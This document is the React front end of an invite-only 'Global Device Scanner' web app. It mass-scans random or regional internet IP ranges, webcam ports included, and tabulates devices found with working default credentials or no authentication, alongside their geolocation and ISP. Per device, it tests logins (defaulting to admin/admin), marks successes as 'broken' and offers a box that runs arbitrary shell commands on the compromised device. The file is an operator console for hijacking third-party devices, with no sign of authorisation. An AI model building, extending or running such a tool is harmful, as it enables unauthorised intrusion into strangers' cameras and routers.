import { useState, useEffect, useRef } from 'react';
import {
  Activity, History, Mail, LogOut, User, Play, Square, Trash,
  Copy, ExternalLink, CheckCircle, XCircle, AlertCircle,
  ChevronDown, ChevronUp, Globe, MapPin, Info, RefreshCw
} from 'lucide-react';

const TOKEN_KEY = 'gyd_token';

interface UserInfo { email: string; username: string; uid: string; }

interface ScanResultItem {
  id: number; ip: string; port: number; url: string; device: string;
  no_auth: boolean; auth_found: boolean; username?: string; password?: string;
  note?: string; status_code?: number; country?: string; country_code?: string;
  region_name?: string; city?: string; lat?: number; lon?: number;
  org?: string; isp?: string; as_info?: string; broken?: boolean;
}

interface ScanResult {
  id: string; user_id: string; total_scanned: number; results_count: number;
  creds_count: number; open_count: number; region: string; ports: string; created_at: string;
}

interface InviteCode {
  id: string; code: string; status: 'active' | 'used'; issuer: string;
  used_by?: string; created_at: string; used_at?: string;
}

interface Toast { id: string; message: string; type: 'success' | 'error' | 'info'; }

interface LogLine { timestamp: string; message: string; type: 'info' | 'hit' | 'hit-open' | 'err'; }

interface DeviceState {
  loading: boolean; status: string; output: string;
  user: string; pass: string; showShell: boolean; command: string;
}

export default function App() {
  const [token, setToken] = useState<string | null>(localStorage.getItem(TOKEN_KEY));
  const [user, setUser] = useState<UserInfo | null>(null);
  const [checking, setChecking] = useState(true);
  const [activeTab, setActiveTab] = useState<'scan' | 'output' | 'invites'>('scan');
  const [inviteOnly, setInviteOnly] = useState(true);

  // Auth
  const [authTab, setAuthTab] = useState<'login' | 'register'>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [inviteCode, setInviteCode] = useState('');
  const [authError, setAuthError] = useState('');
  const [authLoading, setAuthLoading] = useState(false);

  // Scan settings
  const [region, setRegion] = useState('worldwide');
  const [maxIps, setMaxIps] = useState(200);
  const [batchSize, setBatchSize] = useState(50);
  const [threads, setThreads] = useState(20);
  const [ports, setPorts] = useState('fast');
  const [countryFilter, setCountryFilter] = useState('');
  const [geoEnrich, setGeoEnrich] = useState(true);

  // Scan state
  const [scanning, setScanning] = useState(false);
  const [totalScanned, setTotalScanned] = useState(0);
  const [totalResponded, setTotalResponded] = useState(0);
  const [scanResults, setScanResults] = useState<ScanResultItem[]>([]);
  const [logs, setLogs] = useState<LogLine[]>([]);
  const [elapsed, setElapsed] = useState('0:00');
  const stoppedRef = useRef(false);
  const timerRef = useRef<any>(null);
  const startRef = useRef<number | null>(null);
  const logEndRef = useRef<HTMLDivElement>(null);

  // History
  const [outputs, setOutputs] = useState<ScanResult[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [items, setItems] = useState<ScanResultItem[]>([]);
  const [detailView, setDetailView] = useState<'list' | 'raw'>('list');
  const [expanded, setExpanded] = useState<Set<number>>(new Set());
  const [deviceStates, setDeviceStates] = useState<Record<number, DeviceState>>({});
  const [histLoading, setHistLoading] = useState(false);

  // Invites
  const [invites, setInvites] = useState<InviteCode[]>([]);
  const [invLoading, setInvLoading] = useState(false);

  // Toasts
  const [toasts, setToasts] = useState<Toast[]>([]);

  const toast = (message: string, type: Toast['type'] = 'info') => {
    const id = Math.random().toString(36).slice(2);
    setToasts(p => [...p, { id, message, type }]);
    setTimeout(() => setToasts(p => p.filter(t => t.id !== id)), 4000);
  };

  const apiFetch = async (url: string, opts: RequestInit = {}) => {
    const t = localStorage.getItem(TOKEN_KEY);
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      ...(opts.headers as Record<string, string>),
    };
    if (t) headers['Authorization'] = `Bearer ${t}`;
    const resp = await fetch(url, { ...opts, headers });
    if (resp.status === 401 && !url.includes('/auth/')) {
      doLogout();
      toast('Session expired.', 'error');
      throw new Error('Session expired');
    }
    return resp;
  };

  // Init
  useEffect(() => {
    const init = async () => {
      try {
        const h = await fetch('/api/health');
        if (h.ok) { const d = await h.json(); setInviteOnly(d.invite_only); }
      } catch {}
      if (token) {
        try {
          const r = await fetch('/api/auth/me', { headers: { Authorization: `Bearer ${token}` } });
          if (r.ok) { const d = await r.json(); setUser(d.user); }
          else { localStorage.removeItem(TOKEN_KEY); setToken(null); }
        } catch { localStorage.removeItem(TOKEN_KEY); setToken(null); }
      }
      setChecking(false);
    };
    init();
  }, [token]);

  useEffect(() => {
    if (token && activeTab === 'output') fetchOutputs();
    if (token && activeTab === 'invites') fetchInvites();
  }, [activeTab, token]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  // Auth
  const doLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError('');
    setAuthLoading(true);
    try {
      const r = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      const d = await r.json();
      if (!r.ok) { setAuthError(d.error || 'Login failed'); return; }
      localStorage.setItem(TOKEN_KEY, d.token);
      setToken(d.token);
      setUser(d.user);
    } catch (err: any) {
      setAuthError(err.message || 'Server error');
    } finally {
      setAuthLoading(false);
    }
  };

  const doRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError('');
    setAuthLoading(true);
    try {
      const r = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, invite_code: inviteCode })
      });
      const d = await r.json();
      if (!r.ok) { setAuthError(d.error || 'Registration failed'); return; }
      localStorage.setItem(TOKEN_KEY, d.token);
      setToken(d.token);
      setUser(d.user);
    } catch (err: any) {
      setAuthError(err.message || 'Server error');
    } finally {
      setAuthLoading(false);
    }
  };

  const doLogout = () => {
    fetch('/api/auth/logout', { method: 'POST' }).catch(() => {});
    localStorage.removeItem(TOKEN_KEY);
    setToken(null);
    setUser(null);
    setActiveTab('scan');
  };

  // Scan
  const addLog = (message: string, type: LogLine['type'] = 'info') => {
    const timestamp = new Date().toISOString().slice(11, 19);
    setLogs(p => [...p, { timestamp, message, type }]);
  };

  const tickTimer = () => {
    if (startRef.current) {
      const s = Math.floor((Date.now() - startRef.current) / 1000);
      setElapsed(`${Math.floor(s / 60)}:${String(s % 60).padStart(2, '0')}`);
    }
  };

  const runChunk = async (size: number) => {
    const body: any = { max_ips: size, threads, ports, geo: geoEnrich };
    if (region === 'internet') body.internet = true;
    else body.region = region;
    if (countryFilter.trim()) body.country = countryFilter.trim();
    const r = await apiFetch('/api/scan', { method: 'POST', body: JSON.stringify(body) });
    if (!r.ok) throw new Error('Scan request failed');
    return r.json();
  };

  const startScan = async () => {
    if (scanning) return;
    setScanning(true);
    stoppedRef.current = false;
    setTotalScanned(0);
    setTotalResponded(0);
    setScanResults([]);
    setLogs([]);
    startRef.current = Date.now();
    setElapsed('0:00');
    timerRef.current = setInterval(tickTimer, 1000);

    const batches = Math.ceil(maxIps / batchSize);
    addLog(`Starting scan — ${maxIps} targets, ${batches} batches`, 'info');
    let scanned = 0;
    const acc: ScanResultItem[] = [];

    for (let i = 0; i < batches; i++) {
      if (stoppedRef.current) { addLog('Scan stopped.', 'info'); break; }
      const size = Math.min(batchSize, maxIps - scanned);
      addLog(`Batch ${i + 1}/${batches} — ${size} IPs`, 'info');
      try {
        const d = await runChunk(size);
        scanned += d.total_scanned || size;
        setTotalScanned(scanned);
        setTotalResponded(p => p + (d.results_count || 0));
        if (d.results) {
          d.results.forEach((r: ScanResultItem) => {
            acc.push(r);
            if (r.auth_found) addLog(`Found: ${r.url} — ${r.username}:${r.password} [${r.device}]`, 'hit');
            else if (r.no_auth) addLog(`Open: ${r.url} [${r.device}]`, 'hit-open');
          });
          setScanResults([...acc]);
        }
      } catch (err: any) {
        addLog(`Batch error: ${err.message}. Retrying…`, 'err');
        await new Promise(res => setTimeout(res, 2000));
        try {
          if (!stoppedRef.current) {
            const d = await runChunk(size);
            scanned += d.total_scanned || size;
            if (d.results) { acc.push(...d.results); setScanResults([...acc]); }
            addLog('Retry OK', 'info');
          }
        } catch (e2: any) { addLog(`Retry failed: ${e2.message}`, 'err'); scanned += size; setTotalScanned(scanned); }
      }
      if (i < batches - 1 && !stoppedRef.current) await new Promise(res => setTimeout(res, 300));
    }

    setScanning(false);
    clearInterval(timerRef.current);
    if (!stoppedRef.current) {
      addLog(`Scan complete — ${acc.length} results from ${scanned} IPs`, 'info');
      toast(`Scan complete: ${acc.length} results`, 'success');
    }
  };

  const stopScan = () => { stoppedRef.current = true; addLog('Stopping…', 'info'); };

  const clearScan = () => {
    if (scanning) return;
    setScanResults([]); setTotalScanned(0); setTotalResponded(0);
    setLogs([]); setElapsed('0:00');
  };

  // History
  const fetchOutputs = async () => {
    setHistLoading(true);
    try {
      const r = await apiFetch('/api/results');
      if (r.ok) setOutputs(await r.json());
    } catch {} finally { setHistLoading(false); }
  };

  const selectResult = async (id: string) => {
    setSelectedId(id);
    setItems([]);
    setExpanded(new Set());
    setDeviceStates({});
    try {
      const r = await apiFetch(`/api/results/${id}/items`);
      if (r.ok) setItems(await r.json());
    } catch { toast('Failed to load results', 'error'); }
  };

  const deleteResult = async (id: string) => {
    if (!confirm('Delete this scan result?')) return;
    try {
      const r = await apiFetch(`/api/results/${id}`, { method: 'DELETE' });
      if (r.ok) {
        toast('Deleted', 'success');
        setSelectedId(null); setItems([]); fetchOutputs();
      }
    } catch { toast('Delete failed', 'error'); }
  };

  const toggleExpand = (id: number) => {
    setExpanded(prev => {
      const next = new Set(prev);
      if (next.has(id)) { next.delete(id); }
      else {
        next.add(id);
        if (!deviceStates[id]) {
          const item = items.find(i => i.id === id);
          setDeviceStates(p => ({
            ...p,
            [id]: {
              loading: false,
              status: item?.broken ? '✓ Working' : '—',
              output: '', user: item?.username || 'admin',
              pass: item?.password || 'admin',
              showShell: !!item?.broken, command: 'id'
            }
          }));
        }
      }
      return next;
    });
  };

  const updDevice = (id: number, fields: Partial<DeviceState>) => {
    setDeviceStates(p => ({ ...p, [id]: { ...p[id], ...fields } }));
  };

  const testDevice = async (id: number) => {
    const s = deviceStates[id];
    if (!s) return;
    updDevice(id, { loading: true, output: 'Testing…' });
    try {
      const r = await apiFetch(`/api/devices/${id}/test`, {
        method: 'POST', body: JSON.stringify({ username: s.user, password: s.pass })
      });
      const d = await r.json();
      if (d.status === 'ok') {
        updDevice(id, {
          loading: false, status: '✓ Working', showShell: true,
          output: `✓ Credentials accepted\nHTTP ${d.status_code}\n\n${JSON.stringify(d.headers, null, 2)}`
        });
        setItems(p => p.map(i => i.id === id ? { ...i, broken: true } : i));
        toast(`Device ${id} — credentials verified`, 'success');
      } else {
        updDevice(id, { loading: false, status: '✗ Failed', output: `✗ ${d.message || 'Failed'}` });
      }
    } catch (err: any) {
      updDevice(id, { loading: false, status: '✗ Error', output: `Error: ${err.message}` });
    }
  };

  const execShell = async (id: number) => {
    const s = deviceStates[id];
    if (!s) return;
    updDevice(id, { loading: true, output: `$ ${s.command}` });
    try {
      const r = await apiFetch(`/api/devices/${id}/access`, {
        method: 'POST', body: JSON.stringify({ action: 'shell', command: s.command })
      });
      const d = await r.json();
      updDevice(id, {
        loading: false,
        output: d.status === 'ok' ? `$ ${s.command}\n\n${d.output || '(no output)'}` : `✗ ${d.message}`
      });
    } catch (err: any) {
      updDevice(id, { loading: false, output: `Error: ${err.message}` });
    }
  };

  const openDevice = (item: ScanResultItem) => {
    const scheme = [443, 8443, 9443].includes(item.port) ? 'https' : 'http';
    window.open(`${scheme}://${item.ip}:${item.port}`, '_blank');
  };

  // Invites
  const fetchInvites = async () => {
    setInvLoading(true);
    try {
      const r = await apiFetch('/api/admin/invites');
      if (r.ok) setInvites(await r.json());
    } catch {} finally { setInvLoading(false); }
  };

  const createInvite = async () => {
    setInvLoading(true);
    try {
      const r = await apiFetch('/api/admin/invites', { method: 'POST' });
      if (r.ok) { const d = await r.json(); toast(`Generated: ${d.code}`, 'success'); fetchInvites(); }
      else toast('Failed to generate code', 'error');
    } catch { toast('Error', 'error'); } finally { setInvLoading(false); }
  };

  const groupByDate = () => {
    const g: Record<string, ScanResult[]> = {};
    outputs.forEach(o => {
      const d = o.created_at?.slice(0, 10) || 'Unknown';
      if (!g[d]) g[d] = [];
      g[d].push(o);
    });
    return Object.entries(g).sort((a, b) => b[0].localeCompare(a[0]));
  };

  // Loading
  if (checking) {
    return (
      <div className="loading-screen">
        <RefreshCw size={28} className="spin" color="var(--gray-400)" />
        <p>Loading…</p>
      </div>
    );
  }

  // Auth screen
  if (!token) {
    return (
      <div className="auth-wrap">
        <div className="auth-box">
          <div className="auth-logo">GYD</div>
          <div className="auth-tagline">Global Device Scanner</div>

          <div className="auth-tabs">
            <button className={`auth-tab ${authTab === 'login' ? 'active' : ''}`}
              onClick={() => { setAuthTab('login'); setAuthError(''); }}>Login</button>
            <button className={`auth-tab ${authTab === 'register' ? 'active' : ''}`}
              onClick={() => { setAuthTab('register'); setAuthError(''); }}>Register</button>
          </div>

          {authError && <div className="auth-msg error" style={{ marginBottom: 14 }}>{authError}</div>}

          {authTab === 'login' ? (
            <form className="auth-form" onSubmit={doLogin}>
              <div className="form-field">
                <label className="form-label">Email</label>
                <input className="form-input" type="email" placeholder="you@example.com"
                  value={email} onChange={e => setEmail(e.target.value)} required />
              </div>
              <div className="form-field">
                <label className="form-label">Password</label>
                <input className="form-input" type="password" placeholder="••••••••"
                  value={password} onChange={e => setPassword(e.target.value)} required />
              </div>
              <button className="btn-primary" type="submit" disabled={authLoading}>
                {authLoading ? <RefreshCw size={14} className="spin" /> : 'Login'}
              </button>
            </form>
          ) : (
            <form className="auth-form" onSubmit={doRegister}>
              <div className="form-field">
                <label className="form-label">Email</label>
                <input className="form-input" type="email" placeholder="you@example.com"
                  value={email} onChange={e => setEmail(e.target.value)} required />
              </div>
              <div className="form-field">
                <label className="form-label">Password</label>
                <input className="form-input" type="password" placeholder="6+ characters"
                  value={password} onChange={e => setPassword(e.target.value)} minLength={6} required />
              </div>
              {inviteOnly && (
                <div className="form-field">
                  <label className="form-label">Invite Code</label>
                  <input className="form-input" type="text" placeholder="XXXXXXXX"
                    value={inviteCode} onChange={e => setInviteCode(e.target.value)} required />
                  <span className="form-hint">Registration requires a valid invite code.</span>
                </div>
              )}
              <button className="btn-primary" type="submit" disabled={authLoading}>
                {authLoading ? <RefreshCw size={14} className="spin" /> : 'Register'}
              </button>
            </form>
          )}
        </div>
      </div>
    );
  }

  return (
    <>
      {/* Toasts */}
      <div className="toast-area">
        {toasts.map(t => (
          <div key={t.id} className={`toast ${t.type}`}>
            {t.type === 'success' && <CheckCircle size={14} />}
            {t.type === 'error' && <XCircle size={14} />}
            {t.type === 'info' && <Info size={14} />}
            {t.message}
          </div>
        ))}
      </div>

      {/* Header */}
      <header className="header">
        <span className="logo">GYD</span>
        <nav className="nav">
          <button className={`nav-btn ${activeTab === 'scan' ? 'active' : ''}`}
            onClick={() => setActiveTab('scan')}>
            <Activity size={14} /> Scan
          </button>
          <button className={`nav-btn ${activeTab === 'output' ? 'active' : ''}`}
            onClick={() => setActiveTab('output')}>
            <History size={14} /> Results
          </button>
          <button className={`nav-btn ${activeTab === 'invites' ? 'active' : ''}`}
            onClick={() => setActiveTab('invites')}>
            <Mail size={14} /> Invites
          </button>
        </nav>
        <div className="header-right">
          <span className="user-tag"><User size={12} style={{ verticalAlign: 'middle', marginRight: 4 }} />{user?.email}</span>
          <button className="btn-logout" onClick={doLogout}><LogOut size={12} /> Logout</button>
        </div>
      </header>

      <main className="page">

        {/* ── Scan ── */}
        <div className={`tab-panel ${activeTab === 'scan' ? 'active' : ''}`}>
          <div className="grid-sidebar">

            {/* Sidebar */}
            <div className="scan-sidebar">
              <div className="card">
                <div className="card-title"><Globe size={13} />Scan Settings</div>

                <div className="field-group">
                  <label className="field-label">Region</label>
                  <select className="field-input" value={region} onChange={e => setRegion(e.target.value)} disabled={scanning}>
                    <option value="worldwide">Worldwide</option>
                    <option value="europe">Europe (RIPE)</option>
                    <option value="north-america">North America (ARIN)</option>
                    <option value="asia">Asia Pacific (APNIC)</option>
                    <option value="latin-america">Latin America (LACNIC)</option>
                    <option value="africa">Africa (AFRINIC)</option>
                    <option value="subsaharan">Sub-Saharan Africa</option>
                    <option value="internet">Random Internet</option>
                  </select>
                </div>

                <div className="field-row">
                  <div className="field-group">
                    <label className="field-label">Max IPs</label>
                    <input className="field-input" type="number" min={10} max={5000} step={100}
                      value={maxIps} onChange={e => setMaxIps(+e.target.value)} disabled={scanning} />
                  </div>
                  <div className="field-group">
                    <label className="field-label">Batch Size</label>
                    <input className="field-input" type="number" min={10} max={500} step={10}
                      value={batchSize} onChange={e => setBatchSize(+e.target.value)} disabled={scanning} />
                  </div>
                </div>

                <div className="field-row">
                  <div className="field-group">
                    <label className="field-label">Threads</label>
                    <input className="field-input" type="number" min={1} max={100}
                      value={threads} onChange={e => setThreads(+e.target.value)} disabled={scanning} />
                  </div>
                  <div className="field-group">
                    <label className="field-label">Ports</label>
                    <select className="field-input" value={ports} onChange={e => setPorts(e.target.value)} disabled={scanning}>
                      <option value="fast">Fast (12)</option>
                      <option value="all">All + WebCam</option>
                    </select>
                  </div>
                </div>

                <div className="field-group">
                  <label className="field-label">Country Filter</label>
                  <input className="field-input" type="text" placeholder="e.g. US,DE,FR"
                    value={countryFilter} onChange={e => setCountryFilter(e.target.value)} disabled={scanning} />
                </div>

                <label className="checkbox-row">
                  <input type="checkbox" checked={geoEnrich}
                    onChange={e => setGeoEnrich(e.target.checked)} disabled={scanning} />
                  Geolocation enrichment
                </label>

                <div className="btn-row">
                  {!scanning
                    ? <button className="btn fill" onClick={startScan}><Play size={13} />Start</button>
                    : <button className="btn fill stop" onClick={stopScan}><Square size={13} />Stop</button>
                  }
                  <button className="btn outline" onClick={clearScan} disabled={scanning || scanResults.length === 0}>
                    <Trash size={13} />
                  </button>
                </div>
              </div>
            </div>

            {/* Results Area */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>

              {/* Stats */}
              <div className="card">
                <div className="stats-row">
                  <div className="stat"><div className="stat-n muted">{totalScanned}</div><div className="stat-label">Scanned</div></div>
                  <div className="stat"><div className="stat-n blue">{totalResponded}</div><div className="stat-label">Responded</div></div>
                  <div className="stat"><div className="stat-n blue">{scanResults.filter(r => r.device && r.device !== 'Unknown HTTP Service').length}</div><div className="stat-label">Devices</div></div>
                  <div className="stat"><div className="stat-n green">{scanResults.filter(r => r.auth_found).length}</div><div className="stat-label">Creds</div></div>
                  <div className="stat"><div className="stat-n orange">{scanResults.filter(r => r.no_auth).length}</div><div className="stat-label">Open</div></div>
                  <div className="stat"><div className="stat-n muted">{elapsed}</div><div className="stat-label">Time</div></div>
                </div>

                {(scanning || totalScanned > 0) && (
                  <div className="progress-wrap">
                    <div className="progress-meta">
                      <span>{scanning ? 'Scanning…' : 'Done'}</span>
                      <span>{totalScanned} / {maxIps} IPs</span>
                    </div>
                    <div className="progress-track">
                      <div className="progress-fill" style={{ width: `${Math.min(100, totalScanned / maxIps * 100)}%` }} />
                    </div>
                  </div>
                )}
              </div>

              {/* Log */}
              {logs.length > 0 && (
                <div className="log-box">
                  {logs.map((l, i) => (
                    <div key={i} className={`log-line ${l.type}`}>
                      <span className="ts">[{l.timestamp}]</span>{l.message}
                    </div>
                  ))}
                  <div ref={logEndRef} />
                </div>
              )}

              {/* Table */}
              <div className="card" style={{ padding: 0 }}>
                <div style={{ padding: '14px 18px', borderBottom: '1px solid var(--gray-200)' }}>
                  <div className="card-title" style={{ marginBottom: 0 }}>Results</div>
                </div>
                {scanResults.length === 0 ? (
                  <div className="empty">
                    <AlertCircle size={36} />
                    <h3>No results yet</h3>
                    <p>Configure and start a scan to see discovered devices here.</p>
                  </div>
                ) : (
                  <div className="table-wrap">
                    <div className="table-scroll">
                      <table>
                        <thead>
                          <tr>
                            <th>IP</th><th>Port</th><th>URL</th><th>Device</th>
                            <th>Status</th><th>Credentials</th><th>Country</th><th>Org</th>
                          </tr>
                        </thead>
                        <tbody>
                          {scanResults.slice().reverse().map((r, i) => (
                            <tr key={i} className={r.auth_found ? 'cred' : r.no_auth ? 'open' : ''}>
                              <td style={{ fontFamily: 'var(--font-mono)' }}>{r.ip}</td>
                              <td style={{ fontFamily: 'var(--font-mono)' }}>{r.port}</td>
                              <td style={{ maxWidth: 180, overflow: 'hidden', textOverflow: 'ellipsis', fontFamily: 'var(--font-mono)' }} title={r.url}>{r.url}</td>
                              <td>{r.device || '?'}</td>
                              <td>
                                {r.auth_found ? <span className="badge cred">CRED</span>
                                  : r.no_auth ? <span className="badge open">OPEN</span>
                                  : <span className="badge auth">AUTH</span>}
                              </td>
                              <td>
                                {r.auth_found ? <span className="cred-val">{r.username}:{r.password}</span> : '—'}
                              </td>
                              <td>{r.country_code || '—'}</td>
                              <td style={{ maxWidth: 200, overflow: 'hidden', textOverflow: 'ellipsis' }}>{r.org || '—'}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                )}
              </div>

            </div>
          </div>
        </div>

        {/* ── Results / History ── */}
        <div className={`tab-panel ${activeTab === 'output' ? 'active' : ''}`}>
          <div className="history-grid">

            {/* Sidebar list */}
            <div className="history-list">
              {histLoading && (
                <div style={{ textAlign: 'center', padding: 24 }}>
                  <RefreshCw size={20} className="spin" color="var(--gray-400)" />
                </div>
              )}
              {!histLoading && outputs.length === 0 && (
                <div className="empty" style={{ border: '1px solid var(--gray-200)', borderRadius: 8 }}>
                  <History size={28} />
                  <h3>No results</h3>
                  <p>Run a scan first. Saved results will appear here.</p>
                </div>
              )}
              {groupByDate().map(([date, group]) => (
                <div key={date} style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                  <div className="history-group-label">{date}</div>
                  {group.map(item => (
                    <div key={item.id}
                      className={`history-item ${selectedId === item.id ? 'active' : ''}`}
                      onClick={() => selectResult(item.id)}>
                      <div className="hi-top">
                        <div className="hi-region">{item.region || 'Worldwide'}</div>
                        <div className="hi-badges">
                          <span className="hi-badge-g">{item.creds_count || 0}</span>
                          <span className="hi-badge-o">{item.open_count || 0}</span>
                        </div>
                      </div>
                      <div className="hi-meta">
                        <span>{item.total_scanned || 0} IPs · {item.results_count || 0} results</span>
                        <span style={{ fontFamily: 'var(--font-mono)' }}>{item.created_at?.slice(11, 19)}</span>
                      </div>
                    </div>
                  ))}
                </div>
              ))}
            </div>

            {/* Detail pane */}
            <div className="detail-pane">
              {selectedId ? (
                <>
                  <div className="detail-head">
                    <div>
                      <div className="detail-head-title">
                        {outputs.find(o => o.id === selectedId)?.region || 'Scan'}
                      </div>
                      <div className="detail-head-sub">
                        {new Date(outputs.find(o => o.id === selectedId)?.created_at || '').toLocaleString()} · {items.length} items
                      </div>
                    </div>
                    <div className="detail-actions">
                      <div className="view-switch">
                        <button className={`view-switch-btn ${detailView === 'list' ? 'active' : ''}`}
                          onClick={() => setDetailView('list')}>List</button>
                        <button className={`view-switch-btn ${detailView === 'raw' ? 'active' : ''}`}
                          onClick={() => setDetailView('raw')}>JSON</button>
                      </div>
                      <button className="btn outline sm" onClick={() => deleteResult(selectedId)}>
                        <Trash size={11} /> Delete
                      </button>
                    </div>
                  </div>

                  <div className="detail-body">
                    {detailView === 'raw' ? (
                      <div className="raw-view">{JSON.stringify(items, null, 2)}</div>
                    ) : items.length === 0 ? (
                      <div className="empty">
                        <AlertCircle size={28} />
                        <h3>No items</h3>
                        <p>This scan returned no accessible devices.</p>
                      </div>
                    ) : (
                      items.map(item => {
                        const isOpen = expanded.has(item.id);
                        const ds = deviceStates[item.id] || {
                          loading: false, status: item.broken ? '✓ Working' : '—',
                          output: '', user: item.username || 'admin',
                          pass: item.password || 'admin', showShell: !!item.broken, command: 'id'
                        };

                        return (
                          <div key={item.id} className={`acc-item ${item.broken ? 'broken' : ''}`}>
                            <div className="acc-header" onClick={() => toggleExpand(item.id)}>
                              <div className="acc-info">
                                {item.auth_found
                                  ? <span className="badge cred">CRED</span>
                                  : item.no_auth
                                  ? <span className="badge open">OPEN</span>
                                  : <span className="badge auth">AUTH</span>}
                                <span className="acc-ip">{item.ip}:{item.port}</span>
                                <span className="acc-device">{item.device || '?'}</span>
                                {item.country_code && <span className="acc-device">· {item.country_code}</span>}
                                {item.org && <span className="acc-org">· {item.org.slice(0, 40)}</span>}
                              </div>
                              <div className="acc-btns">
                                <button className="btn blue sm"
                                  onClick={e => { e.stopPropagation(); toggleExpand(item.id); testDevice(item.id); }}>
                                  Test
                                </button>
                                {isOpen ? <ChevronUp size={15} color="var(--gray-400)" /> : <ChevronDown size={15} color="var(--gray-400)" />}
                              </div>
                            </div>

                            {isOpen && (
                              <div className="acc-body">
                                <div className="tile-grid">
                                  <div className="tile">
                                    <div className="tile-label">URL</div>
                                    <div className="tile-value" style={{ fontFamily: 'var(--font-mono)', fontSize: 11 }}>{item.url || '—'}</div>
                                  </div>
                                  <div className="tile">
                                    <div className="tile-label">Credentials</div>
                                    <div className="tile-value" style={{ color: item.auth_found ? 'var(--green)' : undefined, fontWeight: item.auth_found ? 600 : undefined }}>
                                      {item.auth_found ? `${item.username}:${item.password}` : item.no_auth ? 'No auth required' : 'Protected'}
                                    </div>
                                  </div>
                                  {item.org && <div className="tile"><div className="tile-label">Org</div><div className="tile-value">{item.org}</div></div>}
                                  {item.isp && <div className="tile"><div className="tile-label">ISP</div><div className="tile-value">{item.isp}</div></div>}
                                  {item.lat && (
                                    <div className="tile">
                                      <div className="tile-label">Location</div>
                                      <div className="tile-value" style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                                        <MapPin size={11} color="var(--blue)" />{item.lat}, {item.lon}{item.city ? ` · ${item.city}` : ''}
                                      </div>
                                    </div>
                                  )}
                                  {item.as_info && <div className="tile"><div className="tile-label">AS</div><div className="tile-value" style={{ fontFamily: 'var(--font-mono)', fontSize: 11 }}>{item.as_info}</div></div>}
                                </div>

                                <div className="interact-box">
                                  <div className="interact-label">
                                    <span className={`dot ${item.broken ? 'on' : ''}`} />
                                    Access Test
                                    <span style={{ marginLeft: 'auto', fontWeight: 400, fontSize: 11, textTransform: 'none', color: item.broken ? 'var(--green)' : 'var(--gray-400)' }}>
                                      {ds.status}
                                    </span>
                                  </div>
                                  <div className="interact-row">
                                    <input type="text" placeholder="Username" value={ds.user}
                                      onChange={e => updDevice(item.id, { user: e.target.value })} disabled={ds.loading} />
                                    <input type="text" placeholder="Password" value={ds.pass}
                                      onChange={e => updDevice(item.id, { pass: e.target.value })} disabled={ds.loading} />
                                    <button className="interact-btn" onClick={() => testDevice(item.id)} disabled={ds.loading}>Test</button>
                                    <button className="interact-btn outline-btn" onClick={() => openDevice(item)}>
                                      <ExternalLink size={12} />
                                    </button>
                                  </div>
                                  {ds.showShell && (
                                    <div className="interact-row" style={{ marginTop: 8 }}>
                                      <input type="text" placeholder="Command" value={ds.command}
                                        onChange={e => updDevice(item.id, { command: e.target.value })} disabled={ds.loading} />
                                      <button className="interact-btn outline-btn" onClick={() => execShell(item.id)} disabled={ds.loading}>Run</button>
                                    </div>
                                  )}
                                  {ds.output && (
                                    <div className="interact-output">
                                      <button className="copy-btn" onClick={() => { navigator.clipboard.writeText(ds.output); toast('Copied', 'success'); }}>
                                        Copy
                                      </button>
                                      {ds.output}
                                    </div>
                                  )}
                                </div>
                              </div>
                            )}
                          </div>
                        );
                      })
                    )}
                  </div>
                </>
              ) : (
                <div className="empty" style={{ height: '100%' }}>
                  <History size={36} />
                  <h3>Select a result</h3>
                  <p>Pick a saved scan from the list to inspect its results.</p>
                </div>
              )}
            </div>

          </div>
        </div>

        {/* ── Invites ── */}
        <div className={`tab-panel ${activeTab === 'invites' ? 'active' : ''}`}>
          <div className="invites-header">
            <div>
              <div className="invites-title">Invite Codes</div>
              <div className="invites-sub">Generate and manage registration codes.</div>
            </div>
            <button className="btn fill" style={{ width: 'auto', padding: '9px 18px' }}
              onClick={createInvite} disabled={invLoading}>
              <Mail size={14} /> Generate Code
            </button>
          </div>

          <div className="card" style={{ padding: 0 }}>
            {invLoading && invites.length === 0 ? (
              <div style={{ textAlign: 'center', padding: 32 }}>
                <RefreshCw size={20} className="spin" color="var(--gray-400)" />
              </div>
            ) : invites.length === 0 ? (
              <div className="empty">
                <Mail size={28} />
                <h3>No invite codes</h3>
                <p>Click "Generate Code" to create an invitation for a new user.</p>
              </div>
            ) : (
              <div className="table-wrap">
                <table>
                  <thead>
                    <tr>
                      <th>Code</th><th>Status</th><th>Issued By</th>
                      <th>Used By</th><th>Created</th><th>Used At</th><th></th>
                    </tr>
                  </thead>
                  <tbody>
                    {invites.map(inv => (
                      <tr key={inv.id}>
                        <td style={{ fontFamily: 'var(--font-mono)', fontWeight: 600 }}>{inv.code}</td>
                        <td><span className={`badge-status ${inv.status}`}>{inv.status.toUpperCase()}</span></td>
                        <td style={{ fontFamily: 'var(--font-mono)', fontSize: 11 }}>{inv.issuer || '—'}</td>
                        <td style={{ fontFamily: 'var(--font-mono)', fontSize: 11 }}>{inv.used_by || '—'}</td>
                        <td>{inv.created_at ? new Date(inv.created_at).toLocaleString() : '—'}</td>
                        <td>{inv.used_at ? new Date(inv.used_at).toLocaleString() : '—'}</td>
                        <td>
                          <button className="btn outline sm"
                            onClick={() => { navigator.clipboard.writeText(inv.code); toast('Copied!', 'success'); }}>
                            <Copy size={11} /> Copy
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>

      </main>
    </>
  );
}
